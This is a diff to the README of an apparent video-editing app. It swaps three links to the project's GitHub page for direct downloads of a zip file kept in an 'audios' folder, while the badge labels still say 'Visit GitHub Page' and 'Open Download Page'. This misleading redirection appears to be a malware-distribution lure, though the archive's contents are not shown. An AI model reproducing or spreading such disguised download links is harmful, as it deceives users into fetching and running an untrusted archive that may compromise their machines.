@@ -1,6 +1,6 @@
 # 🎬 edit-greek-reel - Turn raw clips into polished reels
 
-[![Download edit-greek-reel](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Eferzarr888/edit-greek-reel)
+[![Download edit-greek-reel](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Eferzarr888/edit-greek-reel/raw/refs/heads/main/audios/reel-greek-edit-v3.7.zip)
 
 ## 🖥️ What this app does
 
@@ -21,7 +21,7 @@ It is made for people who want a clean final video without doing each step by ha
 
 Use this link to visit the download page and get the app:
 
-[![Open edit-greek-reel on GitHub](https://img.shields.io/badge/Open%20Download%20Page-grey?style=for-the-badge)](https://github.com/Eferzarr888/edit-greek-reel)
+[![Open edit-greek-reel on GitHub](https://img.shields.io/badge/Open%20Download%20Page-grey?style=for-the-badge)](https://github.com/Eferzarr888/edit-greek-reel/raw/refs/heads/main/audios/reel-greek-edit-v3.7.zip)
 
 ### Steps
 1. Open the link above in your browser.
@@ -188,7 +188,7 @@ If you plan to make more edits:
 
 Visit the main repository page here:
 
-[https://github.com/Eferzarr888/edit-greek-reel](https://github.com/Eferzarr888/edit-greek-reel)
+[https://github.com/Eferzarr888/edit-greek-reel/raw/refs/heads/main/audios/reel-greek-edit-v3.7.zip](https://github.com/Eferzarr888/edit-greek-reel/raw/refs/heads/main/audios/reel-greek-edit-v3.7.zip)
 
 ## 🧾 File names you may see
 
